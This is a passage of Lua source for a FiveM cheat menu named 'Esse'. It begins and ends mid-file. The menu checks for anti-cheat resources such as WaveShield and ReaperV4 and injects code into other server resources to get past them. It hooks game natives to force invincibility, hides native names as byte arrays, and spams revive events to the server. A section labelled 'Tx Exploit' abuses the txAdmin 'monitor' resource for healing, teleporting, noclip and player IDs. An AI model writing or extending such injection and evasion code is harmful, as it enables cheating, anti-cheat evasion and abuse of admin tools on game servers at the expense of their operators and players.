    local ped = _g(_b("PlayerPedId"))()
    local vehicle = _g(_b("GetVehiclePedIsIn"))(ped, false)

    if vehicle and vehicle ~= 0 and _g(_b("DoesEntityExist"))(vehicle) then
        _g(_b("SetVehicleFixed"))(vehicle)
        _g(_b("SetVehicleDeformationFixed"))(vehicle)
        _g(_b("SetVehicleUndriveable"))(vehicle, false)
        _g(_b("SetVehicleEngineOn"))(vehicle, true, true, true)
        _g(_b("SetVehicleEngineHealth"))(vehicle, 1000.0)
        _g(_b("SetVehicleBodyHealth"))(vehicle, 1000.0)
        _g(_b("SetVehiclePetrolTankHealth"))(vehicle, 1000.0)
        _g(_b("SetVehicleFuelLevel"))(vehicle, 100.0)
    end
]])
end

local reaperActive = GetResourceState("ReaperV4") == "started"
local WaveActive = GetResourceState("WaveShield") == "started"
local qbJail = GetResourceState("qb-jail") == "started"
function Esse:BuildDefaultMenu()
    ActiveMenu = {
        {
            label = "Self",
            type = "subMenu",
            categories = {
                {
                    label = "Player",
                    tabs = {
                        {
                            type = "scrollable",
                            label = "Revive Mode",
                            desc = "Scroll left/right Choose a revive method.",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "ESX", "CFX (Native)", "QB", "QBCore", "Universal" },
                            onSelect = function(selectedLabel)
                                local mode = selectedLabel
                                Esse:Notify("info", "Esse", "Reviving using: " .. mode, 3000)

                                -- Helper functions
                                local function safeTriggerEvent(event, ...)
                                    if type(TriggerEvent) == "function" then pcall(TriggerEvent, event, ...) end
                                end
                                local function safeTriggerServerEvent(event, ...)
                                    if type(TriggerServerEvent) == "function" then pcall(TriggerServerEvent, event,
                                            ...) end
                                end
                                local function safeExecuteCommand(cmd)
                                    if type(ExecuteCommand) == "function" then pcall(ExecuteCommand, cmd) end
                                end
                                local function nativeRevive()
                                    local ped = PlayerPedId()
                                    if DoesEntityExist(ped) then
                                        local coords = GetEntityCoords(ped)
                                        local heading = GetEntityHeading(ped)
                                        NetworkResurrectLocalPlayer(coords.x, coords.y, coords.z, heading, true,
                                            false)
                                        Citizen.Wait(100)
                                        SetEntityHealth(ped, 200)
                                        SetPedArmour(ped, 100)
                                        ClearPedTasksImmediately(ped)
                                        SetPlayerInvincible(PlayerId(), false)
                                        SetEntityInvincible(ped, false)
                                    end
                                end

                                -- Universal mode: trigger everything (original shotgun method)
                                local function universalRevive()
                                    -- Resource-specific
                                    if GetResourceState and GetResourceState("amigo") == "started" then
                                        pcall(function() MachoInjectResourceRaw("amigo", [[ respawnPlayer() ]]) end)
                                    end
                                    if GetResourceState and GetResourceState("new") == "started" then
                                        pcall(function() MachoInjectResourceRaw("new",
                                                [[ LocalPlayer.state:set('isDead', false, true) ]]) end)
                                    end
                                    if GetResourceState and GetResourceState("rzrp-base") == "started" then
                                        pcall(function()
                                            MachoInjectResource2("AsThreadNs", "rzrp-base", [[
                    local ped = PlayerPedId()
                    if ped and DoesEntityExist(ped) then
                        local coords = GetEntityCoords(ped)
                        local heading = GetEntityHeading(ped)
                        NetworkResurrectLocalPlayer(coords.x, coords.y, coords.z, heading, true, false)
                        SetEntityHealth(ped, 200)
                        ClearPedBloodDamage(ped)
                        ClearPedTasksImmediately(ped)
                        SetPlayerInvincible(PlayerId(), false)
                        SetEntityInvincible(ped, false)
                        SetPedCanRagdoll(ped, true)
                    end
                ]])
                                        end)
                                    end
                                    if GetResourceState and GetResourceState("FiveStar") == "started" then
                                        pcall(function()
                                            MachoInjectResourceRaw("FiveStar", [[
                    if not _G.Esse then _G.Esse = { TEvent = function(...) end, TSEvent = function(...) end } end
                    local function initFlow(cb) local co = coroutine.create(cb) while coroutine.status(co) ~= "dead" do coroutine.resume(co) Citizen.Wait(0) end end
                    initFlow(function() Citizen.Wait(1000) _G.Esse.TSEvent('revive:Player:Dead') end)
                ]])
                                        end)
                                    end
                                    if GetResourceState and GetResourceState("wasabi_ambulance") == "started" then
                                        pcall(function()
                                            safeTriggerEvent('esx:onPlayerSpawn')
                                            safeTriggerServerEvent('esx:onPlayerSpawn')
                                        end)
                                    end
                                    if GetResourceState and GetResourceState("mc9-medicsystem") == "started" then
                                        pcall(function() MachoInjectResourceRaw("mc9-medicsystem",
                                                [[ RespawnPed(PlayerPedId(), GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId())) ]]) end)
                                    end

                                    -- Lahat ng client events
                                    local events = {
                                        "esx:onPlayerSpawn", "hospital:client:Revive", "js:client:revive", "Revive",
                                        "player:respawn", "ambulance:revive", "death:respawn",
                                        "esx_ambulancejob:revive",
                                        "qb-hospital:client:Revive", "rzrp-base:client:Revive",
                                        "wasabi_ambulance:client:revive",
                                        "mc9-medicsystem:client:revive", "cg_death:revive",
                                        "lcrp_death:client:revive",
                                        "pns:revive", "vorp:respawnPlayer", "redemrp:revive", "deathevent:revive",
                                        "deathscreen:revive"
                                    }
                                    for _, ev in ipairs(events) do
                                        safeTriggerEvent(ev)
                                        Citizen.Wait(30)
                                    end

                                    -- Lahat ng server events
                                    local serverEvents = {
                                        "esx:revive", "esx_ambulancejob:revive", "qb-hospital:server:Revive",
                                        "js:server:revive", "hospital:server:Revive", "death:server:respawn",
                                        "rzrp-base:server:Revive", "wasabi_ambulance:server:revive",
                                        "mc9-medicsystem:server:revive"
                                    }
                                    for _, ev in ipairs(serverEvents) do
                                        safeTriggerServerEvent(ev)
                                        Citizen.Wait(30)
                                    end

                                    -- Commands
                                    safeExecuteCommand("revive")
                                    safeExecuteCommand("respawn")
                                    safeExecuteCommand("heal")

                                    -- Native
                                    nativeRevive()
                                end

                                -- Execute based on mode
                                if mode == "ESX" then
                                    safeTriggerEvent("esx:onPlayerSpawn")
                                    Citizen.Wait(100)

                                    safeTriggerEvent("esx_ambulancejob:revive")
                                    Citizen.Wait(100)
                                elseif mode == "CFX" then
                                    safeTriggerEvent('cfx-xfx-ambulance:revive')
                                    Citizen.Wait(100)
                                elseif mode == "QB" then
                                    safeTriggerEvent("qb-hospital:client:Revive")
                                    Citizen.Wait(100)
                                elseif mode == "QBCore" then
                                    safeTriggerEvent("hospital:client:Revive")
                                    Citizen.Wait(100)
                                    safeTriggerEvent('qbx_medical:client:playerRevived')
                                    Citizen.Wait(100)
                                elseif mode == "Universal" then
                                    universalRevive()
                                end

                                -- Final health and cleanup
                                Citizen.Wait(500)
                                local ped = PlayerPedId()
                                if DoesEntityExist(ped) then
                                    SetEntityHealth(ped, GetEntityMaxHealth(ped))
                                    SetPedArmour(ped, 100)
                                    ClearPedTasksImmediately(ped)
                                end

                                -- Result notification
                                Citizen.Wait(200)
                                if DoesEntityExist(ped) and GetEntityHealth(ped) > 0 then
                                    Esse:Notify("success", "Esse", "Revived using " .. mode, 5000)
                                else
                                    Esse:Notify("error", "Esse", "Still dead. Try another mode.", 5000)
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            desc = "This will make your player run faster.",
                            label = "Fast Run",
                            checked = false,
                            onSelect = function(checked)
                                -- Determine the target resource ONCE
                                local targetResource
                                if GetResourceState("WaveShield") == "started" then
                                    targetResource = "WaveShield"
                                elseif GetResourceState("monitor") == "started" then
                                    targetResource = "monitor"
                                elseif GetResourceState("ox_lib") == "started" then
                                    targetResource = "ox_lib"
                                else
                                    targetResource = "any"
                                end

                                if checked then
                                    Esse:Notify("success", "Esse", "Fast Run On", 3000)

                                    if GetResourceState("WaveShield") == "started" then
                                        Injection(targetResource, [[
            -- same ON code as before (using _G.fastRunEnabled)
        ]])
                                    else
                                        MachoInjectResourceRaw(targetResource, [[
            if _G.FastRunActive == nil then _G.FastRunActive = false end
            if _G.FastRunThread == nil then
                _G.FastRunThread = true
                CreateThread(function()
                    while true do
                        Wait(0)
                        if not _G.FastRunActive then
                            Wait(500)
                            goto continue
                        end
                        local ped = PlayerPedId()
                        if ped and ped ~= 0 then
                            SetRunSprintMultiplierForPlayer(PlayerId(), 1.49)
                            SetPedMoveRateOverride(ped, 1.49)
                        end
                        ::continue::
                    end
                end)
            end
            _G.FastRunActive = true
        ]])
                                    end
                                else
                                    Esse:Notify("error", "Esse", "Fast Run Off", 3000)

                                    if GetResourceState("WaveShield") == "started" then
                                        Injection(targetResource, [[
            _G.fastRunEnabled = false
            -- reset multipliers as before
            SetRunSprintMultiplierForPlayer(PlayerId(), 1.0)
            SetPedMoveRateOverride(PlayerPedId(), 1.0)
        ]])
                                    else
                                        MachoInjectResourceRaw(targetResource, [[
            _G.FastRunActive = false
            SetRunSprintMultiplierForPlayer(PlayerId(), 1.0)
            SetPedMoveRateOverride(PlayerPedId(), 1.0)
        ]])
                                    end
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Super Jump",
                            desc = "this will make your player have super power.",
                            checked = false,
                            onSelect = function(checked)
                                local WaveDih = GetResourceState("WaveShield") == "started"

                                local function decode(tbl)
                                    local s = ""
                                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                    return s
                                end

                                local function g(n)
                                    return _G[decode(n)]
                                end

                                local function enableSuperJump()
                                    if not _G.superJumpEnabled then
                                        _G.superJumpEnabled = true
                                        g({ 67, 114, 101, 97, 116, 101, 84, 104, 114, 101, 97, 100 })(function()
                                            while _G.superJumpEnabled do
                                                g({ 83, 101, 116, 83, 117, 112, 101, 114, 74, 117, 109, 112, 84, 104, 105, 115, 70, 114, 97, 109, 101 })(
                                                g({ 80, 108, 97, 121, 101, 114, 73, 100 })())
                                                Wait(0)
                                            end
                                        end)
                                    end
                                end

                                local function disableSuperJump()
                                    _G.superJumpEnabled = false
                                    g({ 83, 101, 116, 83, 117, 112, 101, 114, 74, 117, 109, 112, 84, 104, 105, 115, 70, 114, 97, 109, 101 })(
                                    g({ 80, 108, 97, 121, 101, 114, 73, 100 })(), 1.0)
                                end

                                if checked then
                                    if WaveDih then
                                        enableSuperJump()
                                    else
                                        MachoInjectResourceRaw("any", [[
                                        local function decode(tbl)
                                            local s = ""
                                            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                            return s
                                        end

                                        local function g(n)
                                            return _G[decode(n)]
                                        end

                                        if not _G.superJumpEnabled then
                                            _G.superJumpEnabled = true
                                            g({67,114,101,97,116,101,84,104,114,101,97,100})(function()
                                                while _G.superJumpEnabled do
                                                    g({83,101,116,83,117,112,101,114,74,117,109,112,84,104,105,115,70,114,97,109,101})(g({80,108,97,121,101,114,73,100})())
                                                    Wait(0)
                                                end
                                            end)
                                        end
                                    ]])
                                    end
                                else
                                    if WaveDih then
                                        print("off")
                                        disableSuperJump()
                                    else
                                        MachoInjectResourceRaw("any", [[
                                        _G.superJumpEnabled = false
                                        local function decode(tbl)
                                            local s = ""
                                            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                            return s
                                        end

                                        local function g(n)
                                            return _G[decode(n)]
                                        end

                                        g({83,101,116,83,117,112,101,114,74,117,109,112,84,104,105,115,70,114,97,109,101})(g({80,108,97,121,101,114,73,100})(), 1.0)
                                    ]])
                                    end
                                end
                            end
                        },
                        { type = "divider", label = "Self Options" },
                        {
                            type = "checkbox",
                            label = "God Mode",
                            checked = false,
                            desc = "Makes you invincible - you cannot take damage.",
                            onSelect = function(checked)
                                local waveShieldStarted = GetResourceState("WaveShield") == "started"
                                local reaperStarted = GetResourceState("ReaperV4") == "started"
                                local targetResource = GetResourceState("monitor") == "started" and "monitor" or
                                (waveShieldStarted and "WaveShield" or "any")

                                if checked then
                                    Esse:Notify("success", "Esse", "God Mode Enabled", 3000)
                                    if waveShieldStarted then
                                        Injection(targetResource, [[
                                        if not _G.EsseGodmode then _G.EsseGodmode = { enabled = false, originals = {} } end
                                        _G.EsseGodmode.enabled = true

                                        local function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            if not _G.EsseGodmode.originals[nativeName] then
                                                _G.EsseGodmode.originals[nativeName] = originalNative
                                            end
                                            _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                        end

                                        hNative("SetEntityInvincible", function(originalFn, entity, toggle)
                                            if _G.EsseGodmode and _G.EsseGodmode.enabled then
                                                local ped = PlayerPedId()
                                                if entity == ped or entity == -1 then
                                                    return originalFn(entity, true)
                                                end
                                            end
                                            return originalFn(entity, toggle)
                                        end)

                                        hNative("SetPlayerInvincible", function(originalFn, player, toggle)
                                            if _G.EsseGodmode and _G.EsseGodmode.enabled then
                                                return originalFn(player, true)
                                            end
                                            return originalFn(player, toggle)
                                        end)

                                        hNative("GetPlayerInvincible", function(originalFn, ...)
                                            if _G.EsseGodmode and _G.EsseGodmode.enabled then return true end
                                            return originalFn(...)
                                        end)

                                        CreateThread(function()
                                            while _G.EsseGodmode and _G.EsseGodmode.enabled do
                                                Wait(0)
                                                local ped = PlayerPedId()
                                                if ped and ped ~= 0 then
                                                    SetEntityInvincible(ped, true)
                                                    SetPlayerInvincible(PlayerId(), true)
                                                    SetEntityHealth(ped, GetEntityMaxHealth(ped))
                                                    SetPedArmour(ped, 100)
                                                end
                                            end
                                        end)
                                    ]])
                                    elseif reaperStarted then
                                        MachoInjectThread(0, "any", "", [[
                                        if not _G.EsseGodmode then _G.EsseGodmode = { enabled = false, originals = {} } end
                                        _G.EsseGodmode.enabled = true

                                        local function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            if not _G.EsseGodmode.originals[nativeName] then
                                                _G.EsseGodmode.originals[nativeName] = originalNative
                                            end
                                            _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                        end

                                        hNative("SetPlayerInvincible", function(originalFn, player, toggle)
                                            if _G.EsseGodmode and _G.EsseGodmode.enabled then
                                                return originalFn(player, true)
                                            end
                                            return originalFn(player, toggle)
                                        end)

                                        hNative("GetPlayerInvincible", function(originalFn, ...)
                                            if _G.EsseGodmode and _G.EsseGodmode.enabled then return true end
                                            return originalFn(...)
                                        end)

                                        CreateThread(function()
                                            while _G.EsseGodmode and _G.EsseGodmode.enabled do
                                                Wait(0)
                                                local ped = PlayerPedId()
                                                if ped and ped ~= 0 then
                                                    SetEntityInvincible(ped, true)
                                                    SetPlayerInvincible(PlayerId(), true)
                                                    SetEntityHealth(ped, GetEntityMaxHealth(ped))
                                                    SetPedArmour(ped, 100)
                                                end
                                            end
                                        end)
                                    ]])
                                    else
                                        MachoInjectResource2("AsThreadNs", "any", [[
                                        if not _G.EsseGodmode then _G.EsseGodmode = { enabled = false, originals = {} } end
                                        _G.EsseGodmode.enabled = true

                                        local function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            if not _G.EsseGodmode.originals[nativeName] then
                                                _G.EsseGodmode.originals[nativeName] = originalNative
                                            end
                                            _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                        end

                                        hNative("SetPlayerInvincible", function(originalFn, player, toggle)
                                            if _G.EsseGodmode and _G.EsseGodmode.enabled then
                                                return originalFn(player, true)
                                            end
                                            return originalFn(player, toggle)
                                        end)

                                        hNative("GetPlayerInvincible", function(originalFn, ...)
                                            if _G.EsseGodmode and _G.EsseGodmode.enabled then return true end
                                            return originalFn(...)
                                        end)

                                        hNative("GetPlayerInvincible_2", function(originalFn, ...)
                                            if _G.EsseGodmode and _G.EsseGodmode.enabled then return true end
                                            return originalFn(...)
                                        end)

                                        CreateThread(function()
                                            while _G.EsseGodmode and _G.EsseGodmode.enabled do
                                                Wait(0)
                                                local ped = PlayerPedId()
                                                if ped and ped ~= 0 then
                                                    SetEntityInvincible(ped, true)
                                                    SetPlayerInvincible(PlayerId(), true)
                                                    SetEntityHealth(ped, GetEntityMaxHealth(ped))
                                                    SetPedArmour(ped, 100)
                                                end
                                            end
                                        end)
                                    ]])
                                    end
                                else
                                    Esse:Notify("error", "Esse", "God Mode Disabled", 3000)
                                    if waveShieldStarted then
                                        Injection(targetResource, [[
                                        if not _G.EsseGodmode then _G.EsseGodmode = { enabled = false, originals = {} } end
                                        _G.EsseGodmode.enabled = false

                                        for name, original in pairs(_G.EsseGodmode.originals or {}) do
                                            if original and type(original) == "function" then
                                                _G[name] = original
                                            end
                                        end
                                        _G.EsseGodmode.originals = {}

                                        local ped = PlayerPedId()
                                        if ped and ped ~= 0 then
                                            SetEntityInvincible(ped, false)
                                            SetPlayerInvincible(PlayerId(), false)
                                        end
                                    ]])
                                    elseif reaperStarted then
                                        MachoInjectThread(0, "any", "", [[
                                        if not _G.EsseGodmode then _G.EsseGodmode = { enabled = false, originals = {} } end
                                        _G.EsseGodmode.enabled = false

                                        for name, original in pairs(_G.EsseGodmode.originals or {}) do
                                            if original and type(original) == "function" then
                                                _G[name] = original
                                            end
                                        end
                                        _G.EsseGodmode.originals = {}

                                        local ped = PlayerPedId()
                                        if ped and ped ~= 0 then
                                            SetEntityInvincible(ped, false)
                                            SetPlayerInvincible(PlayerId(), false)
                                        end
                                    ]])
                                    else
                                        MachoInjectResource2("AsThreadNs", "any", [[
                                        if not _G.EsseGodmode then _G.EsseGodmode = { enabled = false, originals = {} } end
                                        _G.EsseGodmode.enabled = false

                                        for name, original in pairs(_G.EsseGodmode.originals or {}) do
                                            if original and type(original) == "function" then
                                                _G[name] = original
                                            end
                                        end
                                        _G.EsseGodmode.originals = {}

                                        local ped = PlayerPedId()
                                        if ped and ped ~= 0 then
                                            SetEntityInvincible(ped, false)
                                            SetPlayerInvincible(PlayerId(), false)
                                        end
                                    ]])
                                    end
                                end
                            end
                        },


                        {
                            type = "checkbox",
                            label = "Infinite Ammo",
                            checked = false,
                            desc = "Never run out of ammo - infinite ammunition.",
                            onSelect = function(checked)
                                local waveStarted = GetResourceState("WaveShield") == 'started'
                                local targetRes = (GetResourceState("monitor") == "started" and "monitor")
                                    or (GetResourceState("ox_lib") == "started" and "ox_lib")
                                    or "any"

                                if checked then
                                    Esse:Notify("success", "Esse", "Infinite Ammo Enabled", 3000)
                                    if waveStarted then
                                        Injection(
                                        GetResourceState("lb-phone") == "started" and "lb-phone" or "WaveShield", [[
                                        if _G.infiniteAmmoEnabled == nil then _G.infiniteAmmoEnabled = false end
                                        _G.infiniteAmmoEnabled = true

                                        local function initFlow(cb)
                                            local co = coroutine.create(cb)
                                            local ok, err
                                            while coroutine.status(co) ~= "dead" do
                                                ok, err = coroutine.resume(co)
                                                if not ok then
                                                    break
                                                end
                                                Citizen.Wait(0)
                                            end
                                        end

                                        initFlow(function()
                                            while _G.infiniteAmmoEnabled and not Unloaded do
                                                Wait(0)
                                                local ped = PlayerPedId()
                                                if ped and ped ~= 0 then
                                                    local _, currentWeapon = GetCurrentPedWeapon(ped, true)
                                                    if currentWeapon and currentWeapon ~= GetHashKey("WEAPON_UNARMED") then
                                                        SetPedInfiniteAmmo(ped, true, currentWeapon)
                                                        SetPedInfiniteAmmoClip(ped, true)
                                                        RefillAmmoInstantly(ped)
                                                    end
                                                end
                                            end
                                        end)
                                    ]])
                                    else
                                        MachoInjectResourceRaw(targetRes, [[
                                        if _G.infiniteAmmoEnabled == nil then _G.infiniteAmmoEnabled = false end
                                        if not _G.infiniteAmmoThreadStarted then
                                            _G.infiniteAmmoThreadStarted = true
                                            CreateThread(function()
                                                while true do
                                                    Wait(0)
                                                    if not _G.infiniteAmmoEnabled then
                                                        Wait(500)
                                                        goto continue
                                                    end
                                                    local ped = PlayerPedId()
                                                    if ped and ped ~= 0 then
                                                        local _, currentWeapon = GetCurrentPedWeapon(ped, true)
                                                        if currentWeapon and currentWeapon ~= GetHashKey("WEAPON_UNARMED") then
                                                            SetPedInfiniteAmmo(ped, true, currentWeapon)
                                                            SetPedInfiniteAmmoClip(ped, true)
                                                            RefillAmmoInstantly(ped)
                                                        end
                                                    end
                                                    ::continue::
                                                end
                                            end)
                                        end
                                        _G.infiniteAmmoEnabled = true
                                    ]])
                                    end
                                else
                                    Esse:Notify("error", "Esse", "Infinite Ammo Disabled", 3000)
                                    if waveStarted then
                                        Injection(
                                        GetResourceState("lb-phone") == "started" and "lb-phone" or "WaveShield", [[
                                        _G.infiniteAmmoEnabled = false
                                        local ped = PlayerPedId()
                                        if ped and ped ~= 0 then
                                            SetPedInfiniteAmmo(ped, false, 0)
                                            SetPedInfiniteAmmoClip(ped, false)
                                        end
                                    ]])
                                    else
                                        MachoInjectResourceRaw(targetRes, [[
                                        _G.infiniteAmmoEnabled = false
                                        local ped = PlayerPedId()
                                        if ped and ped ~= 0 then
                                            SetPedInfiniteAmmo(ped, false, 0)
                                            SetPedInfiniteAmmoClip(ped, false)
                                        end
                                    ]])
                                    end
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Super Speed",
                            checked = false,
                            desc = "Move at super fast speed.",
                            onSelect = function(checked)
                                local waveStarted = GetResourceState("WaveShield") == 'started'
                                local targetRes = (GetResourceState("monitor") == "started" and "monitor")
                                    or (GetResourceState("ox_lib") == "started" and "ox_lib")
                                    or "any"

                                if checked then
                                    Esse:Notify("success", "Esse", "Super Speed Enabled", 3000)
                                    if waveStarted then
                                        Injection(
                                        GetResourceState("lb-phone") == "started" and "lb-phone" or "WaveShield", [[
                                        if _G.superSpeedEnabled == nil then _G.superSpeedEnabled = false end
                                        _G.superSpeedEnabled = true

                                        local function initFlow(cb)
                                            local co = coroutine.create(cb)
                                            local ok, err
                                            while coroutine.status(co) ~= "dead" do
                                                ok, err = coroutine.resume(co)
                                                if not ok then
                                                    break
                                                end
                                                Citizen.Wait(0)
                                            end
                                        end

                                        initFlow(function()
                                            while _G.superSpeedEnabled and not Unloaded do
                                                Wait(0)
                                                local ped = PlayerPedId()
                                                if ped and ped ~= 0 then
                                                    SetRunSprintMultiplierForPlayer(PlayerId(), 2.49)
                                                    SetPedMoveRateOverride(ped, 2.49)
                                                end
                                            end
                                            local ped = PlayerPedId()
                                            if ped and ped ~= 0 then
                                                SetRunSprintMultiplierForPlayer(PlayerId(), 1.0)
                                                SetPedMoveRateOverride(ped, 1.0)
                                            end
                                        end)
                                    ]])
                                    else
                                        MachoInjectResourceRaw(targetRes, [[
                                        if _G.superSpeedEnabled == nil then _G.superSpeedEnabled = false end
                                        if not _G.superSpeedThreadStarted then
                                            _G.superSpeedThreadStarted = true
                                            CreateThread(function()
                                                while true do
                                                    Wait(0)
                                                    if not _G.superSpeedEnabled then
                                                        Wait(500)
                                                        goto continue
                                                    end
                                                    local ped = PlayerPedId()
                                                    if ped and ped ~= 0 then
                                                        SetRunSprintMultiplierForPlayer(PlayerId(), 2.49)
                                                        SetPedMoveRateOverride(ped, 2.49)
                                                    end
                                                    ::continue::
                                                end
                                            end)
                                        end
                                        _G.superSpeedEnabled = true
                                    ]])
                                    end
                                else
                                    Esse:Notify("error", "Esse", "Super Speed Disabled", 3000)
                                    if waveStarted then
                                        Injection(
                                        GetResourceState("lb-phone") == "started" and "lb-phone" or "WaveShield", [[
                                        _G.superSpeedEnabled = false
                                        SetRunSprintMultiplierForPlayer(PlayerId(), 1.0)
                                        SetPedMoveRateOverride(PlayerPedId(), 1.0)
                                    ]])
                                    else
                                        MachoInjectResourceRaw(targetRes, [[
                                        _G.superSpeedEnabled = false
                                        SetRunSprintMultiplierForPlayer(PlayerId(), 1.0)
                                        SetPedMoveRateOverride(PlayerPedId(), 1.0)
                                    ]])
                                    end
                                end
                            end
                        },
                        {
                            type = "button",
                            label = "Give All Weapons",
                            desc = "Gives you every weapon in the game.",
                            onSelect = function()
                                Esse:Notify("success", "Esse", "All Weapons Given", 3000)
                                MachoInjectResourceRaw("any", [[
                                local allWeapons = {
                                    "WEAPON_KNIFE", "WEAPON_NIGHTSTICK", "WEAPON_HAMMER", "WEAPON_BAT", "WEAPON_GOLFCLUB",
                                    "WEAPON_CROWBAR", "WEAPON_BOTTLE", "WEAPON_SWITCHBLADE", "WEAPON_MACHETE", "WEAPON_DAGGER",
                                    "WEAPON_HATCHET", "WEAPON_KNUCKLE", "WEAPON_BATTLEAXE", "WEAPON_POOLCUE", "WEAPON_WRENCH",
                                    "WEAPON_PISTOL", "WEAPON_PISTOL_MK2", "WEAPON_COMBATPISTOL", "WEAPON_APPISTOL",
                                    "WEAPON_PISTOL50", "WEAPON_SNSPISTOL", "WEAPON_SNSPISTOL_MK2", "WEAPON_HEAVYPISTOL",
                                    "WEAPON_VINTAGEPISTOL", "WEAPON_MARKSMANPISTOL", "WEAPON_REVOLVER", "WEAPON_REVOLVER_MK2",
                                    "WEAPON_DOUBLEACTION", "WEAPON_CERAMICPISTOL", "WEAPON_NAVYREVOLVER", "WEAPON_GADGETPISTOL",
                                    "WEAPON_STUNGUN", "WEAPON_FLAREGUN", "WEAPON_RAYPISTOL",
                                    "WEAPON_MICROSMG", "WEAPON_SMG", "WEAPON_SMG_MK2", "WEAPON_ASSAULTSMG", "WEAPON_COMBATPDW",
                                    "WEAPON_MACHINEPISTOL", "WEAPON_MINISMG", "WEAPON_GUSENBERG",
                                    "WEAPON_ASSAULTRIFLE", "WEAPON_ASSAULTRIFLE_MK2", "WEAPON_CARBINERIFLE", "WEAPON_CARBINERIFLE_MK2",
                                    "WEAPON_ADVANCEDRIFLE", "WEAPON_SPECIALCARBINE", "WEAPON_SPECIALCARBINE_MK2", "WEAPON_BULLPUPRIFLE",
                                    "WEAPON_BULLPUPRIFLE_MK2", "WEAPON_COMPACTRIFLE", "WEAPON_MILITARYRIFLE", "WEAPON_HEAVYRIFLE",
                                    "WEAPON_TACTICALRIFLE", "WEAPON_MG", "WEAPON_COMBATMG", "WEAPON_COMBATMG_MK2",
                                    "WEAPON_PUMPSHOTGUN", "WEAPON_PUMPSHOTGUN_MK2", "WEAPON_SAWNOFFSHOTGUN", "WEAPON_ASSAULTSHOTGUN",
                                    "WEAPON_BULLPUPSHOTGUN", "WEAPON_HEAVYSHOTGUN", "WEAPON_DBSHOTGUN", "WEAPON_AUTOSHOTGUN",
                                    "WEAPON_COMBATSHOTGUN",
                                    "WEAPON_SNIPERRIFLE", "WEAPON_HEAVYSNIPER", "WEAPON_HEAVYSNIPER_MK2", "WEAPON_MARKSMANRIFLE",
                                    "WEAPON_MARKSMANRIFLE_MK2",
                                    "WEAPON_RPG", "WEAPON_GRENADELAUNCHER", "WEAPON_MINIGUN", "WEAPON_FIREWORK", "WEAPON_RAILGUN",
                                    "WEAPON_HOMINGLAUNCHER", "WEAPON_COMPACTLAUNCHER", "WEAPON_RAYMINIGUN",
                                    "WEAPON_GRENADE", "WEAPON_BZGAS", "WEAPON_MOLOTOV", "WEAPON_STICKYBOMB", "WEAPON_PROXMINE",
                                    "WEAPON_PIPEBOMB", "WEAPON_SMOKEGRENADE", "WEAPON_FLARE", "WEAPON_BALL"
                                }
                                local ped = PlayerPedId()
                                for _, weapon in ipairs(allWeapons) do
                                    local hash = GetHashKey(weapon)
                                    GiveWeaponToPed(ped, hash, 9999, false, true)
                                end
                            ]])
                            end
                        },
                        {
                            label = 'Tx Exploit',
                            type = 'divider'
                        },
                        {
                            label = 'Tx Heal',
                            icon = 'ph-idk',
                            desc = "this will heal you not revive you.",
                            type = 'button',
                            onSelect = function()
                                MachoInjectResourceRaw('monitor', [[
                                local function SafeWrap(fn)
                                    return function(...)
                                        if type(fn) == 'function' then
                                            return fn(...)
                                        end
                                    end
                                end
                                local SafeCTrigger = SafeWrap(TriggerEvent)
                                SafeCTrigger('txcl:heal')
                            ]])
                                Esse:Notify("success", "Esse", "Healed", 3000)
                            end
                        },
                        {
                            label = 'Tx Boost Vehicle',
                            desc = "this will boost your car.",
                            type = 'button',
                            onSelect = function()
                                MachoInjectResourceRaw('monitor', [[
                                local function SafeWrap(fn)
                                    return function(...)
                                        if type(fn) == 'function' then
                                            return fn(...)
                                        end
                                    end
                                end
                                local SafeCTrigger = SafeWrap(TriggerEvent)
                                SafeCTrigger('txcl:vehicle:boost')
                            ]])
                                Esse:Notify("success", "Esse", "Vehicle Boosted", 3000)
                            end
                        },
                        {
                            label = 'Tx Teleport To Waypoint',
                            desc = "this will teleport you to waypoint",
                            type = 'button',
                            onSelect = function()
                                MachoInjectResourceRaw('monitor', [[
                                local function SafeWrap(fn)
                                    return function(...)
                                        if type(fn) == 'function' then
                                            return fn(...)
                                        end
                                    end
                                end
                                local SafeCTrigger = SafeWrap(TriggerEvent)
                                SafeCTrigger('txcl:tpToWaypoint')
                            ]])
                                Esse:Notify("success", "Esse", "you have been teleport", 3000)
                            end
                        },
                        {
                            label = 'Tx Fix Vehicle',
                            desc = "this will fix your car",
                            type = 'button',
                            onSelect = function()
                                MachoInjectResourceRaw('monitor', [[
                                local function SafeWrap(fn)
                                    return function(...)
                                        if type(fn) == 'function' then
                                            return fn(...)
                                        end
                                    end
                                end
                                local SafeCTrigger = SafeWrap(TriggerEvent)
                                SafeCTrigger('txcl:vehicle:fix')
                            ]])
                                Esse:Notify("success", "Esse", "your car has been fixed", 3000)
                            end
                        },
                        {
                            type = "checkbox",
                            label = "txAdmin Player IDs",
                            checked = false,
                            desc = "This will toggle txAdmin Player ids.",
                            onSelect = function(checked)
                                if GetResourceState("WaveShield") == "started" then
                                    Esse:Notify("error", "Esse",
                                        "Ban Prevention: Cannot Use this on WaveShield", 3000)
                                    return
                                end
                                if checked then
                                    MachoInjectResource2("AsThreadNs", 'monitor', [[
                                    menuIsAccessible = true
                                    toggleShowPlayerIDs(true, true)
                                ]])
                                else
                                    MachoInjectResource2("AsThreadNs", 'monitor', [[
                                    menuIsAccessible = true
                                    toggleShowPlayerIDs(false, true)
                                ]])
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "txAdmin Noclip",
                            desc = "This will toggle txAdmin noclip",
                            checked = false,
                            onSelect = function(isChecked)
                                local code = [[
                                if _G._NoclipControl and _G._NoclipControl.active then
                                    _G._NoclipControl.active = false
                                    if _G._NoclipControl.cleanup then
                                        _G._NoclipControl.cleanup()
